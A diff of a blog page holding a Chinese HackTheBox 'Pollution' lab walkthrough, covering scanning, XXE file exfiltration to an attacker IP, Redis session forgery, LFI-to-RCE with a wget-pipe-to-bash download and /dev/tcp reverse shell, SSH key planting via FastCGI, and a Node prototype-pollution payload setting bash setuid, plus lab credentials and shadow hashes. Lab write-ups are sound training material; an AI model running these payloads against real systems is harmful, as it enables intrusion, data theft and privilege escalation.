@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;517  10.10.11.192                                                                                                              端口扫描22,80: 12345678">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;517  10.10.11.192   端口扫描22,80: 12345678910111213141516171819202122$ nmap -sC -sV -Pn 10.10.11.192Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Pollution - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/12/26/Pollution-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;517  10.10.11.192                                                                                                              端口扫描22,80: 12345678">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;517  10.10.11.192   端口扫描22,80: 12345678910111213141516171819202122$ nmap -sC -sV -Pn 10.10.11.192Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-1">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122601.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122602.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022122603.jpg">
@@ -131,8 +131,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -154,7 +161,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -222,105 +229,35 @@
 </li>
 <li><h2 id="10-10-11-192"><a href="#10-10-11-192" class="headerlink" title="10.10.11.192"></a>10.10.11.192</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122601.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122601.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.192</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 13:08 CST</span><br><span class="line">Nmap scan report for 10.10.11.192</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)</span><br><span class="line">|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)</span><br><span class="line">|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.54 ((Debian))</span><br><span class="line">|_http-title: Home</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.54 (Debian)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 62.48 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>公司官网，底部得到域名：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122602.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122602.jpg" alt=""></p>
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>加hosts后继续枚举子域名，发现forum和developers：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.192 collect.htb</span><br><span class="line"></span><br><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://collect.htb/" -H 'Host: FUZZ.collect.htb' -fs 0,26197</span><br><span class="line"></span><br><span class="line">forum                   [Status: 200, Size: 14098, Words: 910, Lines: 337, Duration: 325ms]</span><br><span class="line">developers              [Status: 401, Size: 469, Words: 42, Lines: 15, Duration: 189ms</span><br></pre></td></tr></table></figure>
 
 <p>两个子域名同样加hosts：</p>
 <h2 id="forum"><a href="#forum" class="headerlink" title="forum"></a>forum</h2><p>MyBB forum：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122603.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122603.jpg" alt=""></p>
 <h2 id="developers"><a href="#developers" class="headerlink" title="developers"></a>developers</h2><p>需要登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122604.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122604.jpg" alt=""></p>
 <h1 id="forum-1"><a href="#forum-1" class="headerlink" title="forum"></a>forum</h1><p>forum任意注册登录,memberlist中可以得到用户名列表：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122605.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122605.jpg" alt=""></p>
 <p>浏览论坛内容，知道Pollution API和k8s,附件中还可以得到一些请求响应信息,包括使用的token:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token ： ddac62a28254561001277727cb397baf</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122606.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122607.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122606.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122607.jpg" alt=""></p>
 <h1 id="COLLECT-ADMIN"><a href="#COLLECT-ADMIN" class="headerlink" title="COLLECT ADMIN"></a>COLLECT ADMIN</h1><p>注意得到的请求是针对主站的，看起来是设置管理员的，所以我们回到主站，注册账号登录，然后使用token把我们设置为admin：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122608.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122608.jpg" alt=""></p>
 <p>admin界面是注册POLLUTION API的账号：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122609.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122609.jpg" alt=""></p>
 <h1 id="POLLUTION-API"><a href="#POLLUTION-API" class="headerlink" title="POLLUTION API"></a>POLLUTION API</h1><p>随意测试添加，发现使用XML：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122610.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122610.jpg" alt=""></p>
 <h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p> 常规XXE：</p>
 <ul>
 <li>XXE - XEE - XML External Entity - HackTricks<br><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#html-entities" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#html-entities</a></li>
@@ -330,22 +267,8 @@
 
 <h2 id="file-read"><a href="#file-read" class="headerlink" title="file read"></a>file read</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manage_api&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;10.10.14.5:7777&#x2F;file.dtd&quot;&gt; %xxe;]&gt;&lt;root&gt;.....</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122611.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122612.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122611.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122612.jpg" alt=""></p>
 <p>后面就是一点点读文件，../bootstrp.php中得到redis密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COLLECTR3D1SPASS</span><br></pre></td></tr></table></figure>
 
@@ -357,65 +280,23 @@
 <h2 id="file-dtd"><a href="#file-dtd" class="headerlink" title="file.dtd"></a>file.dtd</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&#39;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;10.10.14.5:7777&#x2F;?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
 
 <h1 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h1><p>使用得到的密码查看redis，发现里面是我们的session id：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122613.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122613.jpg" alt=""></p>
 <p>developer中使用得到的账号密码登录后还有第二层登录，这时redis中多了一条数据，是developer那边的,可以尝试直接修改为已认证数据，绕过登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122614.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122615.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122614.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122615.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.192:6379&gt; set PHPREDIS_SESSION:64eocsg047rtkcf4j9s7ffubfr &quot;username|s:4:\&quot;miao\&quot;;role|s:5:\&quot;admin\&quot;;auth|s:1:\&quot;a\&quot;;&quot;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122616.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122616.jpg" alt=""></p>
 <h1 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI to RCE"></a>LFI to RCE</h1><p>page参数LFI，使用php filter进行RCE：</p>
 <ul>
 <li>synacktiv/php_filter_chain_generator<br><a href="https://github.com/synacktiv/php_filter_chain_generator" target="_blank" rel="noopener">https://github.com/synacktiv/php_filter_chain_generator</a></li>
 <li>hxp CTF 2021 - The End Of LFI? - 跳跳糖<br><a href="https://tttang.com/archive/1395/" target="_blank" rel="noopener">https://tttang.com/archive/1395/</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122617.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122617.jpg" alt=""></p>
 <h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>需要尽可能短，所以我们通过下载执行的方式,得到www-data shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> file m</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">python3 php_filter_chain_generator.py --chain '&lt;?=`wget -O - 10.10.14.5/m|bash`?&gt;'</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122618.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122618.jpg" alt=""></p>
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>/var/www/developers/login.php中得到数据库密码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"webapp_user"</span>, <span class="string">"Str0ngP4ssw0rdB*12@1"</span>, <span class="string">"developers"</span>);</span><br></pre></td></tr></table></figure>
 
@@ -424,26 +305,12 @@
 <li>Fastcgi PHP-FPM Client &amp;&amp; Code Execution<br><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></li>
 </ul>
 <h1 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h1><p>fastcgi是victor权限：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122619.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122619.jpg" alt=""></p>
 <p>我们可以把公钥写到victor用户目录，从而ssh连接：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fpm.py -c '&lt;?php system("echo \"ssh-rsa ...\" &gt; /home/victor/.ssh/authorized_keys"); exit; ?&gt;' 127.0.0.1 /tmp/miao.php</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>victor用户目录得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122620.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122620.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>常规枚举发现root运行的<code>/usr/bin/node /root/pollution_api/index.js</code></p>
 <p>在 victor 的主目录中有一份代码副本：<code>/home/victor/pollution_api</code></p>
 <p>查看代码结合靶机名称，很容易发现原型链污染漏洞,Messages_send.js中调用merge：</p>
@@ -459,14 +326,7 @@
 <p>现在，我们可以登录<code>miao</code>并接收具有<code>admin</code>特权的令牌并利用<code>/admin/messages/send</code>API</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:3000/auth/login -H "content-type: application/json" -d '&#123;"username":"miao","password":"123456"&#125;'</span><br><span class="line">&#123;"Status":"Ok","Header":&#123;"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibWlhbyIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MjAzODE2NSwiZXhwIjoxNjcyMDQxNzY1fQ.kpsNQJhRwHHoTZ0Gd60GTnlrW738aNKHlYS7fEzHlas"&#125;&#125;</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:3000/admin/messages/send -H "x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibWlhbyIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MjAzODE2NSwiZXhwIjoxNjcyMDQxNzY1fQ.kpsNQJhRwHHoTZ0Gd60GTnlrW738aNKHlYS7fEzHlas" -H "content-type: application/json" -d '&#123;"text":&#123;"constructor":&#123;"prototype":&#123;"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"&#125;&#125;&#125;&#125;'</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122621.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022122621.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$ckehF3Y37zdTv6yQyHrbL1$3eyEH9Pq4Rq&#x2F;Pg8EX99DkT9UxvsxaNdw99TUEAuYEN1:19254:0:99999:7:::</span><br><span class="line">victor:$y$j9T$X5cO0WaSdvC8raJwnWISq1$yJkDJIDRqr2G.lT4UxnxP.qXFOql7awV88g5ugpJKI7:19231:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 
@@ -488,7 +348,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2023-07-03T00:45:24.254Z" itemprop="dateUpdated">2023-07-03 08:45:24</time>
+    Last updated: <time datetime="2023-07-03T00:45:24.254Z" itemprop="dateUpdated">2023-07-03 08:45:24</time>
 </span><br>
 
 
@@ -655,11 +515,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
